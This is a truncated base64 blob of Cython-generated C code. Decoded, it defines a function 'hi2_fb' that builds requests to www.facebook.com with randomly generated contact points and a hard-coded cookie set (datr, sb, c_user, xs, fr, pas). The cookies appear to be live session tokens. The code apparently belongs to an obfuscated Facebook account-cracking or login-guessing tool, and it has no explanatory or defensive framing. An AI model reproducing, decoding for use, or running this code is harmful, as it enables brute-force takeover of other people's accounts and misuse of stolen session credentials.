Hl4X3RfNik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fcHl4X3RfOCA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfdF83fTsKICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF82LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgyLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgIH0KICAgIGlmICh1bmxpa2VseShfX1B5eF9MaXN0Q29tcF9BcHBlbmQoX19weXhfciwgKFB5T2JqZWN0KilfX3B5eF90XzQpKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBD""WVRIT05fTUFZQkVfVU5VU0VEX1ZBUihfX3B5eF9jdXJfc2NvcGUpOwoKICAKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOyBfX3B5eF9yID0gMDsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOwogIGlmIChfX1B5eF9QeUVycl9PY2N1cnJlZCgpKSB7CiAgICBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKDApOwogICAgX19QeXhfQWRkVHJhY2ViYWNrKCJnZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgfQogIF9fcHl4X0wwOjsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICAjaWYgIUNZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihfX3B5eF9nZW5lcmF0b3IpOwogICNlbmRpZgogIF9fcHl4X2dlbmVyYXRvci0+cmVzdW1lX2xhYmVsID0gLTE7CiAgX19QeXhfQ29yb3V0aW5lX2NsZWFyKChQeU9iamVjdCopX19weXhfZ2VuZXJhdG9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJnYV8yaGkyX2ZiKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfdGhyZWFkX2lkKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfRSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfQyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfQSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfRyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfSSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfQiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfSiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfSyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfTCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfTSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfTiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfTyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfUCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfUSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X2diXzJnYV82aGkyX2ZiXzJnZW5lcmF0b3IgPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzU7CiAgUHlP""YmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfN1szXTsKICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMTE7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEzID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE2ID0gTlVMTDsKICBpbnQgX19weXhfdF8xNzsKICBQeU9iamVjdCAqX19weXhfdF8xOCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTlbNl07CiAgUHlPYmplY3QgKl9fcHl4X3RfMjAgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIxID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yMls4XTsKICBpbnQgX19weXhfdF8yMzsKICBQeU9iamVjdCAqX19weXhfdF8yNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMjUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzI2ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yNyA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMjg7CiAgY2hhciBjb25zdCAqX19weXhfdF8yOTsKICBQeU9iamVjdCAqX19weXhfdF8zMCA9IE5VTEw7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiaGkyX2ZiIiwgMCk7CgogIAogIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29udGFjdF9wb2ludCk7CiAgX19weXhfdl9FID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvbnRhY3RfcG9pbnQ7CgogIAogIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYnJvd3Nlcl9kcm9wZG93bik7CiAgX19weXhfdl9DID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Jyb3dzZXJfZHJvcGRvd247CgogIAogIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91Xyk7CiAgX19weXhfdl9BID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV87CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDY3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1Nlc3Npb24pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlY""X0VSUigwLCA2NywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19weXhfdF81ID0gMTsKICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNCkpKSB7CiAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpOwogICAgYXNzZXJ0KF9fcHl4X3RfMik7CiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzQsIF9fcHl4X19mdW5jdGlvbik7CiAgICBfX3B5eF90XzUgPSAwOwogIH0KICAjZW5kaWYKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMS1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNjcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgfQogIF9fcHl4X3ZfRyA9IF9fcHl4X3RfMTsKICBfX3B5eF90XzEgPSAwOwoKICAKICB3aGlsZSAoMSkgewoKICAgIAogICAgX19weXhfdF80ID0gTlVMTDsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3JhbmdlKTsKICAgIF9fcHl4X3RfMiA9IF9fcHl4X2J1aWx0aW5fcmFuZ2U7IAogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ycik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7""IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBfX3B5eF90XzUgPSAxOwogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF90XzN9OwogICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgfQogICAgX19weXhfdF8yID0gX19weXhfcGZfMmdhXzZoaTJfZmJfZ2VuZXhwcihOVUxMLCBfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19weXhfdF8xID0gX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoX19weXhfdF8yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fcHl4X3RfMiA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X3ZfQSwgX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfSSwgKChQeU9iamVjdCopX19weXhfdF8yKSk7CiAgICBfX3B5eF90XzIgPSAwOwoKICAgIAogICAgX19weXhfdF8yID0gX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoX19weXhfdl9JKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNzAsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX3B5eF90XzMgPSBOVUxMOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jYyk7""IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDcwLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZGhkb21haW4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA3MCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgIF9fcHl4X3RfNSA9IDE7CiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF80KSkpIHsKICAgICAgX19weXhfdF8zID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF80KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfMyk7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF80KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNCwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF81ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8zLCBfX3B5eF90XzZ9OwogICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDItX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA3MCwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgfQogICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDcwLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShfX3B5eF90XzIsIF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDcwLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAg""X19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfQiwgKChQeU9iamVjdCopX19weXhfdF8xKSk7CiAgICBfX3B5eF90XzEgPSAwOwoKICAgIAogICAgX19weXhfdF8xID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDE1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2FfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9HQTFfMV82MjYzOTY4MjNfMTc1NDY2NDQwMCkgPCAwKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dhXzAyVkY5RDVGMjYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfR1MyXzFfczE3NTg4MjE3NTFfbzJfZzBfdDE3NTg4MjEpIDwgMCkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2lSNWFIZGNISU50bVlkMXNGdGI3Zmp0KSA8IDApIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2IsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9naVI1YU9JdUVScjNvaW1kVlhMSEJTQkkpIDwgMCkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tX3BpeGVsX3JhdGlvLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzIpIDwgMCkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93ZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zNjB4ODAwKSA8IDApIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHNfbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xKSA8IDApIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHNfbiwg""X19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xKSA8IDApIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY191c2VyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzYxNTU1ODY2MTY3NTY3KSA8IDApIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfeHMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjBfM0F4QnZBUDFTY3Y1Vm5Td18zQTJfM0ExNzU4ODIpIDwgMCkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8welRtaGhoQTJBeHBjbkhCVF9BV2ZyX0h1aEQyc2U0TCkgPCAwKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xvY2FsZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VuX0dCKSA8IDApIF9fUFlYX0VSUigwLCA3MSwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcGFzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzYxNTU1ODY2MTY3NTY3XzNBbTBjQXpwaHU1eCkgPCAwKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dsX2NidiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV92Ml8zQmNsaWVudF92ZXJzaW9uXzNBMjkzNV8zQnRpbSkgPCAwKSBfX1BZWF9FUlIoMCwgNzEsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZibF9zdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xMDE3MzI2MjhfM0JUXzNBMjkzMTM2ODkpIDwgMCkgX19QWVhfRVJSKDAsIDcxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfSiwgKChQeU9iamVjdCopX19weXhfdF8xKSk7CiAgICBfX3B5eF90XzEgPSAwOwoKICAgIAogICAgX19weXhfdF8xID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDIyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNzMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9t""c3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXV0aG9yaXR5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3d3d19mYWNlYm9va19jb20pIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hY2NlcHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdGV4dF9odG1sX2FwcGxpY2F0aW9uX3hodG1sX3htbCkgPCAwKSBfX1BZWF9FUlIoMCwgNzMsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NlcHRfbGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5fR0JfZW5fcV8wXzkpIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfY2FjaGVfY29udHJvbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9tYXhfYWdlXzApIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3V